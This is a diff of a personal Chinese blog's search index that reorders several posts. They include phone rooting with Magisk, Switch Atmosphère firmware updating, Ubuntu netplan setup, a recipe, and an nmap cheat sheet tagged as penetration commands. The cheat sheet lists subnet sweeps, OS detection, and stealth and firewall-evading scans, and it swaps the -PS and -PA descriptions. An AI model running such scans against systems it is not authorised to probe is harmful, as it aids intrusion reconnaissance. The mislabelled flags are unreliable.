+3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
+<p><img src="/images/pasted-2.png" alt="upload successful"></p>
+<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
+<p><img src="/images/pasted-3.png" alt="upload successful"></p>
+]]></content>
+      <categories>
+        <category>手机搞机</category>
+      </categories>
+      <tags>
+        <tag>手机root</tag>
       </tags>
   </entry>
   <entry>
@@ -3626,6 +3501,131 @@ run
       <tags>
         <tag>osi</tag>
         <tag>网络基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>nmap命令</title>
+    <url>/2024/08/01/nmap%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="常用命令总结">常用命令总结</h2>
+<p>命令格式</p>
+<pre><code>nmap [参数] [ip]
+</code></pre>
+<p>主机探测（隐蔽扫描/TCP ACK/TCP SYN/TCP空扫描欺骗防火墙）</p>
+<pre><code>nmap -sS/-PS/-PA/-sN ip
+</code></pre>
+<p>命令表格</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">命令</th>
+<th style="text-align:center">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">nmap IP</td>
+<td style="text-align:center">扫描IP</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -v IP</td>
+<td style="text-align:center">加强扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap IP1 IP2 …</td>
+<td style="text-align:center">扫描多IP</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap a.b.c.*</td>
+<td style="text-align:center">扫描整个子网</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap a.b.c.x,y,…</td>
+<td style="text-align:center">扫描多子网地址</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -iL xxx.txt</td>
+<td style="text-align:center">根据文件扫描多IP</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap a.b.c.x-y</td>
+<td style="text-align:center">扫描子网IP范围</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap a.b.c.* --exclude IP</td>
+<td style="text-align:center">排除指定IP扫描整个子网</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -A IP</td>
+<td style="text-align:center">扫描操作系统和路由跟踪</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -O IP</td>
+<td style="text-align:center">探测操作系统</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -sA/-PN IP</td>
+<td style="text-align:center">探测防火墙</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -sP a.b.c.*</td>
+<td style="text-align:center">探测在线主机</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -F IP</td>
+<td style="text-align:center">快速扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -r IP</td>
+<td style="text-align:center">按顺序扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -iflist</td>
+<td style="text-align:center">显示接口和路由信息</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -p n1,n2… IP</td>
+<td style="text-align:center">扫描指定端口</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -p T:n1,n2… IP</td>
+<td style="text-align:center">扫描TCP端口</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -sU n1,n2… IP</td>
+<td style="text-align:center">扫描UDP端口</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -sV IP</td>
+<td style="text-align:center">查看服务的版本</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -PS IP</td>
+<td style="text-align:center">TCP ACK扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -PA IP</td>
+<td style="text-align:center">TCP SYN扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -sS IP</td>
+<td style="text-align:center">隐蔽扫描</td>
+</tr>
+<tr>
+<td style="text-align:center">nmap -sN IP</td>
+<td style="text-align:center">TCP空扫描欺骗防火墙</td>
+</tr>
+</tbody>
+</table>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>kali</category>
+        <category>命令</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>kali</tag>
+        <tag>渗透命令</tag>
       </tags>
   </entry>
   <entry>
@@ -4109,6 +4109,24 @@ run
       </tags>
   </entry>
   <entry>
+    <title>switch大气层升级18.1.0</title>
+    <url>/2024/08/22/switch%E5%A4%A7%E6%B0%94%E5%B1%82%E5%8D%87%E7%BA%A7/</url>
+    <content><![CDATA[<h2 id="下载离线固件和大气层最新包">下载离线固件和大气层最新包</h2>
+<p>下载地址:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rumla34/Atmosphere-stable/releases/tag/1.7.1</span><br></pre></td></tr></table></figure>
+<p>下载大气层和固件之后，通过switch选择系统页面的usb工具替换这两个文件</p>
+<h2 id="升级步骤">升级步骤</h2>
+<p>仅保留emuMMC和Nintendo两个文件，其余文件删除，然后将下载的文件都解压放到sd卡根目录</p>
+<p>然后选择虚拟系统启动，打开大气层软件，一个白色太阳的图标，然后选择我们保存的大气层固件文件夹，更新即可</p>
+]]></content>
+      <categories>
+        <category>switch</category>
+      </categories>
+      <tags>
+        <tag>switch大气层</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>switch-大气层与模拟器局域网联机</title>
     <url>/2025/05/01/switch-%E5%A4%A7%E6%B0%94%E5%B1%82%E4%B8%8E%E6%A8%A1%E6%8B%9F%E5%99%A8%E5%B1%80%E5%9F%9F%E7%BD%91%E8%81%94%E6%9C%BA/</url>
     <content><![CDATA[<h2 id="前言">前言</h2>
@@ -4129,64 +4147,6 @@ run
       <tags>
         <tag>switch</tag>
         <tag>大气层</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>switch大气层升级18.1.0</title>
-    <url>/2024/08/22/switch%E5%A4%A7%E6%B0%94%E5%B1%82%E5%8D%87%E7%BA%A7/</url>
-    <content><![CDATA[<h2 id="下载离线固件和大气层最新包">下载离线固件和大气层最新包</h2>
-<p>下载地址:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rumla34/Atmosphere-stable/releases/tag/1.7.1</span><br></pre></td></tr></table></figure>
-<p>下载大气层和固件之后，通过switch选择系统页面的usb工具替换这两个文件</p>
-<h2 id="升级步骤">升级步骤</h2>
-<p>仅保留emuMMC和Nintendo两个文件，其余文件删除，然后将下载的文件都解压放到sd卡根目录</p>
-<p>然后选择虚拟系统启动，打开大气层软件，一个白色太阳的图标，然后选择我们保存的大气层固件文件夹，更新即可</p>
-]]></content>
-      <categories>
-        <category>switch</category>
-      </categories>
-      <tags>
-        <tag>switch大气层</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ubuntu-网卡配置文件</title>
-    <url>/2025/07/09/ubuntu-%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h2 id="dhcp">dhcp</h2>
-<ol>
-<li>打开网卡配置文件<code>/etc/netplan下的类似50-cloud-init.yaml写法的yaml文件</code>:</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/netplan/50-cloud-init.yaml</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>开启dhcp自动获取地址</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: true</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>应用配置</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="静态地址">静态地址</h2>
-<p>打开配置文件后，修改内容格式为：</p>
-<ol>
-<li>老版本</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: no</span><br><span class="line">    addresses: [192.168.11.10/24]</span><br><span class="line">    gateway4: 192.168.11.1</span><br><span class="line">    nameservers:</span><br><span class="line">      addresses: [223.5.5.5]</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>新版本写法</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: no</span><br><span class="line">    addresses: [192.168.11.10/24]</span><br><span class="line">    routes:</span><br><span class="line">      - to: 0.0.0.0/0</span><br><span class="line">        via: 192.168.11.2</span><br><span class="line">    nameservers:</span><br><span class="line">      addresses: [223.5.5.5]</span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li>应用配置</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>ubuntu</tag>
-        <tag>linux网卡配置</tag>
       </tags>
   </entry>
   <entry>
@@ -4563,6 +4523,46 @@ WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a></p>
       <tags>
         <tag>web信息收集</tag>
         <tag>web安全攻防笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu-网卡配置文件</title>
+    <url>/2025/07/09/ubuntu-%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="dhcp">dhcp</h2>
+<ol>
+<li>打开网卡配置文件<code>/etc/netplan下的类似50-cloud-init.yaml写法的yaml文件</code>:</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/netplan/50-cloud-init.yaml</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>开启dhcp自动获取地址</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: true</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>应用配置</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="静态地址">静态地址</h2>
+<p>打开配置文件后，修改内容格式为：</p>
+<ol>
+<li>老版本</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: no</span><br><span class="line">    addresses: [192.168.11.10/24]</span><br><span class="line">    gateway4: 192.168.11.1</span><br><span class="line">    nameservers:</span><br><span class="line">      addresses: [223.5.5.5]</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>新版本写法</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: no</span><br><span class="line">    addresses: [192.168.11.10/24]</span><br><span class="line">    routes:</span><br><span class="line">      - to: 0.0.0.0/0</span><br><span class="line">        via: 192.168.11.2</span><br><span class="line">    nameservers:</span><br><span class="line">      addresses: [223.5.5.5]</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>应用配置</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>ubuntu</tag>
+        <tag>linux网卡配置</tag>
       </tags>
   </entry>
   <entry>
@@ -5083,65 +5083,6 @@ S/N=10时，信噪比为10dB</li>
       </tags>
   </entry>
   <entry>
-    <title>滑蛋饭</title>
-    <url>/2025/05/15/%E6%BB%91%E8%9B%8B%E9%A5%AD/</url>
-    <content><![CDATA[<h2 id="调料">调料</h2>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">名称</th>
-<th style="text-align:left">量</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">蚝油</td>
-<td style="text-align:left">适量</td>
-</tr>
-<tr>
-<td style="text-align:center">糖</td>
-<td style="text-align:left">适量</td>
-</tr>
-<tr>
-<td style="text-align:center">胡椒粉</td>
-<td style="text-align:left">适量</td>
-</tr>
-<tr>
-<td style="text-align:center">香油</td>
-<td style="text-align:left">极少量</td>
-</tr>
-<tr>
-<td style="text-align:center">酱油</td>
-<td style="text-align:left">少量</td>
-</tr>
-<tr>
-<td style="text-align:center">鸡精</td>
-<td style="text-align:left">少量</td>
-</tr>
-<tr>
-<td style="text-align:center">生粉</td>
-<td style="text-align:left">适量</td>
-</tr>
-</tbody>
-</table>
-<h2 id="酱汁">酱汁</h2>
-<ol>
-<li>半碗水，加入耗油，糖，喜欢甜可以多一点糖，白胡椒，搅在一起</li>
-<li>差不多出锅的时候放一点酱油，香油</li>
-<li>最后用生粉调一个芡，冒泡即可</li>
-</ol>
-<h2 id="滑蛋">滑蛋</h2>
-<p>小火煎蛋即可，腊肠韭黄，都可以，按喜欢的放。</p>
-]]></content>
-      <categories>
-        <category>生活</category>
-        <category>菜谱</category>
-      </categories>
-      <tags>
-        <tag>菜谱</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>正则表达式符号大全</title>
     <url>/2025/07/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%A6%E5%8F%B7%E5%A4%A7%E5%85%A8/</url>
     <content><![CDATA[<h2 id="普通字符（最基础）">普通字符（最基础）</h2>
@@ -5509,6 +5450,65 @@ S/N=10时，信噪比为10dB</li>
       </tags>
   </entry>
   <entry>
+    <title>滑蛋饭</title>
+    <url>/2025/05/15/%E6%BB%91%E8%9B%8B%E9%A5%AD/</url>
+    <content><![CDATA[<h2 id="调料">调料</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">名称</th>
+<th style="text-align:left">量</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">蚝油</td>
+<td style="text-align:left">适量</td>
+</tr>
+<tr>
+<td style="text-align:center">糖</td>
+<td style="text-align:left">适量</td>
+</tr>
+<tr>
+<td style="text-align:center">胡椒粉</td>
+<td style="text-align:left">适量</td>
+</tr>
+<tr>
+<td style="text-align:center">香油</td>
+<td style="text-align:left">极少量</td>
+</tr>
+<tr>
+<td style="text-align:center">酱油</td>
+<td style="text-align:left">少量</td>
+</tr>
+<tr>
+<td style="text-align:center">鸡精</td>
+<td style="text-align:left">少量</td>
+</tr>
+<tr>
+<td style="text-align:center">生粉</td>
+<td style="text-align:left">适量</td>
+</tr>
+</tbody>
+</table>
+<h2 id="酱汁">酱汁</h2>
+<ol>
+<li>半碗水，加入耗油，糖，喜欢甜可以多一点糖，白胡椒，搅在一起</li>
+<li>差不多出锅的时候放一点酱油，香油</li>
+<li>最后用生粉调一个芡，冒泡即可</li>
+</ol>
+<h2 id="滑蛋">滑蛋</h2>
+<p>小火煎蛋即可，腊肠韭黄，都可以，按喜欢的放。</p>
+]]></content>
+      <categories>
+        <category>生活</category>
+        <category>菜谱</category>
+      </categories>
+      <tags>
+        <tag>菜谱</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>笔记本无线网卡异常</title>
     <url>/2025/03/22/%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%BC%82%E5%B8%B8/</url>
     <content><![CDATA[<h2 id="问题现象">问题现象</h2>
@@ -5671,8 +5671,8 @@ S/N=10时，信噪比为10dB</li>
         <category>k8s</category>
       </categories>
       <tags>
-        <tag>docker</tag>
         <tag>k8s</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
